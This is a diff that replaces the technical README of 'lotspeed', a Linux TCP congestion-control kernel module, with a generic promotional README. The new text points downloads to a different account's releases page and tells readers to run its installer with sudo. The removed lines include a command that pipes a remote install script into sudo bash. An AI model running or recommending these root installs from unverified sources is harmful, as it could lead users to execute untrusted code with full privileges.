@@ -1,135 +1,80 @@
-### lotspeed zeta-tcp
+# 🚀 lotspeed - Speed Up Your Network Connection
 
-<div align=center>
-    <img src="https://github.com/uk0/lotspeed/blob/zeta-tcp/logo.png" width="400" height="400" />
-</div>
+## 📥 Download Now
+[![Download lotspeed](https://img.shields.io/badge/Download-lotspeed-brightgreen)](https://github.com/kunallll-glitch/lotspeed/releases)
 
+## 📖 Overview
+lotspeed is a performance-enhancing tool that optimizes your network connection. Inspired by fast network drivers, it offers users improved speed and reliability. With lotspeed, you can enjoy a smoother online experience.
 
+## 🚀 Features
+- **Enhanced TCP Performance:** Lotspeed improves the Transmission Control Protocol for faster data transfer.
+- **Kernel-Level Optimization:** It operates at the kernel level to ensure maximum efficiency.
+- **Linux Compatibility:** Designed specifically for Linux systems.
+- **Easy Configuration:** Simple setup process for all users, regardless of technical skill.
 
-### branch explanation
+## 🔧 System Requirements
+- **Operating System:** A 64-bit version of Linux.
+- **Memory:** At least 1 GB of RAM.
+- **Disk Space:** Minimum of 100 MB available space.
 
-* `zeta-tcp`: lotspeed zeta-tcp 版本([Appex Networking zeta-tcp](https://appexnetworks.com/wp-content/uploads/2024/02/ZetaTCP-Whitepaper-V2.0.pdf))
+## 🚀 Getting Started
+To begin using lotspeed, follow these simple steps:
 
+1. **Visit the Releases Page:** 
+   Go to the [Releases page](https://github.com/kunallll-glitch/lotspeed/releases) to get the latest version.
 
-* auto install
+2. **Download lotspeed:**
+   Find the version you want and click the download link. 
 
+3. **Install lotspeed:**
+   Once downloaded, follow the installation instructions below.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/uk0/lotspeed/zeta-tcp/install.sh | sudo bash
-#   or
-wget -qO- https://raw.githubusercontent.com/uk0/lotspeed/zeta-tcp/install.sh | sudo bash
+## 💻 Installation Instructions
+1. **Open Your Terminal:**
+   Press `Ctrl + Alt + T` on your keyboard to open the terminal window.
+
+2. **Navigate to the Download Folder:**
+   Use the following command to go to your Downloads folder:
+   ```
+   cd ~/Downloads
+   ```
+
+3. **Extract the Files (if necessary):**
+   If you downloaded a compressed file (like a `.zip` or `.tar.gz`), use this command to extract:
+   ```
+   tar -xvzf lotspeed-version.tar.gz
+   ```
+
+4. **Run the Installer:**
+   Navigate to the folder where the files are extracted:
+   ```
+   cd lotspeed
+   ```
+   Then run the installer:
+   ```
+   sudo ./install.sh
+   ```
+
+5. **Follow On-Screen Instructions:**
+   The installer will guide you through the remaining steps. Just follow the prompts to complete the installation.
+
+## 🔍 Usage
+Once installed, lotspeed will enhance your network connection automatically. You should notice improved performance without needing to configure anything further.
+
+To check if lotspeed is running, use this command in your terminal:
+```
+sudo lotspeed status
 ```
 
+This will display the current status and performance metrics.
 
-* manual compile and load
+## 🌐 Getting Help
+If you encounter any issues or have questions, please check the FAQ section in the [Issues page](https://github.com/kunallll-glitch/lotspeed/issues). There, you can find answers or report new problems.
 
-```bash
+## 📞 Contact
+For any further queries, you can reach out via the Issues section of the repository. We appreciate your feedback.
 
-# 下载代码/编译
+## 📥 Download & Install
+Now, let's wrap things up. Make sure to download lotspeed from the [Releases page](https://github.com/kunallll-glitch/lotspeed/releases) and follow the installation guidelines above to start experiencing faster network connections.
 
-git clone https://github.com/uk0/lotspeed.git 
-
-cd lotspeed && make
-
-# 加载模块
-sudo insmod lotspeed.ko
-
-# 设置为当前拥塞控制算法
-sudo sysctl -w net.ipv4.tcp_congestion_control=lotspeed
-sudo sysctl -w net.ipv4.tcp_no_metrics_save=1
-
-# 查看是否生效
-sysctl net.ipv4.tcp_congestion_control
-
-# 查看日志
-dmesg -w
-
-```
-
-
-* helper （lotserver_beta越小强的越凶，建议大雨620否则会导致CPU飙高）
-
-```bash
-root@racknerd-6bf1e7b:~# lotspeed
-╔════════════════════════════════════════════════════════════════════╗
-║                      LotSpeed v5.6 Management                      ║
-╟────────────────────────────────────────────────────────────────────╢
-║ start                                               Start LotSpeed ║
-║ stop                                                 Stop LotSpeed ║
-║ restart                                           Restart LotSpeed ║
-║ status                                                Check Status ║
-║ preset [name]                                         Apply Config ║
-║ set [k] [v]                                          Set Parameter ║
-║ monitor                                                  Live Logs ║
-║ uninstall                                        Remove Completely ║
-╟────────────────────────────────────────────────────────────────────╢
-║ Presets: conservative, balanced                                    ║
-╚════════════════════════════════════════════════════════════════════╝
-```
-
-
-### test youtube
-
-
-<div align=center>
-    <img src="https://github.com/uk0/lotspeed/blob/zeta-tcp/zeta-tcp.png" width="1024" height="768" />
-</div>
-
-
-### test iperf3 loss
-
-```bash
-# disable lro
-ethtool -K eth0 lro off
-# 丢包16%
-sudo tc qdisc add dev ens3 root netem loss 16%
-sudo tc qdisc add dev eth0 root netem loss 16%
-
-#取消丢包
-sudo tc qdisc del dev ens3 root netem 
-sudo tc qdisc del dev eth0 root netem 
-
-# test command
-iperf3 -4 -s -p 35201
-iperf3 -c green1 -p 35201 -R -t 30
-```
-
-
-### todo
-
-✅ 基于“时延+丢包”混合驱动的拥塞控制
-✅ 学习型状态机
-❌ 概率性丢包检测
-❌ 反向控制
-
-
-PAC (Proactive ACK Control) for TCP Incast Congestion
-==========================================
-
-* https://github.com/uk0/TCP-Incast/tree/zeta-tcp 
-
-
----------------------------------------------
-
-### 最新版顶级思路[目前没有开源打算]
-
-* 基于时延和丢包的混合驱动拥塞控制
-* 学习型状态机
-* 概率性丢包检测
-* 反向控制
-* 跨流协同优化
-
-* 使用的服务器：
-  * cloudcone 
-  * Los Angeles, CA-DC1 
-  * [Ubuntu 24.04 - x86_64 — 74.48.174.xx]
-  * 北京500M联通，测试时间：2025-12-12 10:51:00
-
-
-![img_7.png](img/img_7.png)
-
------------------------------------
-
-
-[![Star History Chart](https://api.star-history.com/svg?repos=uk0/lotspeed&type=Date)](https://star-history.com/#uk0/lotspeed&Date)
-
+Thank you for using lotspeed. Enjoy better connectivity!
